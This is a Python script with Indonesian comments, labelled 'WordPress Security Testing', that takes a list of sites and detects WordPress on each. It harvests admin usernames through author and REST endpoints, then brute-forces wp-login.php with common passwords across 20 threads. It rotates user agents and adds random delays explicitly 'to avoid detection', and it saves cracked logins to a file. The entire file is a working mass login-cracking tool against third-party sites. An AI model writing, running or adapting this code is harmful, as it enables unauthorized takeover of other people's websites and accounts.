import requests
import os
import re
import random
import time
from multiprocessing.dummy import Pool
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

# Cek jika menggunakan sistem Windows atau Linux untuk membersihkan layar
def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

clear_screen()

# Kelas untuk warna pada terminal
class Colors:
    green = '\033[1;32m'
    red = '\033[31m'
    yellow = '\033[1;33m'
    blue = '\033[1;34m'
    cyan = '\033[1;36m'
    purple= '\033[1;35m'
    reset = '\033[0m'

# Banner atau tampilan alat
def print_banner():
    print(Colors.green + """
▄   ▄ ▄▄▄▄   ▄▄▄  ▄  ▄▄▄ ▄▄▄▄▄ 
 ▀▄▀  █   █ █   █ ▄ █     ▄▄▄▀ 
▄▀ ▀▄ █   █ ▀▄▄▄▀ █ █    █▄▄▄▄ 
                  █            
                               
                               
                               
    """ + Colors.cyan + """
                    Telegram: @xnoirz (WordPress Security Testing)
    """ + Colors.reset)

print_banner()

# Konfigurasi sesi dengan retry
def configure_session():
    session = requests.Session()
    retry = Retry(
        total=5,
        backoff_factor=1,
        status_forcelist=[500, 502, 503, 504]
    )
    adapter = HTTPAdapter(max_retries=retry)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    return session

session = configure_session()

# Fungsi untuk memilih user agent secara acak
def random_user_agent():
    user_agent_list = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
    ]
    return random.choice(user_agent_list)

# Fungsi untuk membuat variasi password yang umum
def generate_common_passwords(username):
    passwords = [
        "password", "123456", "admin", "123456789", "qwerty", "12345",
        "pass1234", "1234567", "pass123", "admin123", f"{username}123",
        f"{username}2023", f"{username}2024", "welcome", "abc123", "pass", "admin@123", "admin123@"
    ]
    return passwords

# Fungsi untuk mencoba login dengan username dan password tertentu
def try_login(site, username, passwd):
    try:
        headers = {'User-Agent': random_user_agent()}
        r = session.post(site + "/wp-login.php", data={'log': username, 'pwd': passwd}, headers=headers, timeout=30)
        time.sleep(random.uniform(0.5, 2.0))  # Jeda acak untuk menghindari deteksi
        if "wp-admin/profile.php" in r.text or r.status_code == 302:
            print(Colors.purple + f"Cracked! --> {site}/wp-login.php : {username} : {passwd} [ WordPress ]")
            with open("good.txt", "a") as f:
                f.write(f"WordPress --> {site}/wp-login.php : {username} : {passwd}\n")
            return True
        else:
            print(Colors.red + f"Failed! --> {site}/wp-login.php : {username} : {passwd}")
            return False
    except Exception as e:
        print(Colors.red + f"Error saat mencoba login ke {site}: {str(e)}")
        return False

# Fungsi utama untuk mencoba login ke WordPress
def wordpress(site, username):
    print(f"Mencoba login dengan username asli: {username}")
    if try_login(site, username, username):
        return

    for passwd in generate_common_passwords(username):
        if try_login(site, username, passwd):
            return

# Fungsi untuk deteksi CMS WordPress dan mencari username
def cms(site):
    try:
        headers = {'User-Agent': random_user_agent()}
        r = session.get(site, headers=headers, timeout=30)
        if "wp-content" in r.text:
            print(Colors.green + f"[WordPress Detected] {site}")
            username = find_wp_username(site)
            if username:
                print(Colors.blue + f"Username ditemukan: {username}")
                wordpress(site, username)
            else:
                print(Colors.red + f"Tidak dapat menemukan username di {site}")
        else:
            print(Colors.yellow + f"[No CMS detected] {site}")
    except Exception as e:
        print(Colors.red + f"Error detecting CMS on {site}: {str(e)}")

# Fungsi untuk mencari username di WordPress
def find_wp_username(site):
    try:
        headers = {'User-Agent': random_user_agent()}
        endpoints = ["/?author=1", "/wp-json/wp/v2/users"]
        for endpoint in endpoints:
            r = session.get(site + endpoint, headers=headers, timeout=30)
            username = re.search(r"/author/([^/]+)/", r.url) or re.search(r'"slug":"([^"]+)"', r.text)
            if username:
                return username.group(1)
    except Exception as e:
        print(Colors.red + f"Error finding WordPress username on {site}: {str(e)}")
    return None

# Mengambil input sitelist
sitelist = input(Colors.blue + "Sitelist --> " + Colors.reset)

try:
    with open(sitelist, "r") as file:
        sites = file.read().splitlines()

    with Pool(min(20, len(sites))) as pool:
        pool.map(cms, sites)
except FileNotFoundError:
    print(Colors.reset + "File sitelist tidak ditemukan!")
except Exception as e:
    print(Colors.reset + f"Error: {str(e)}")
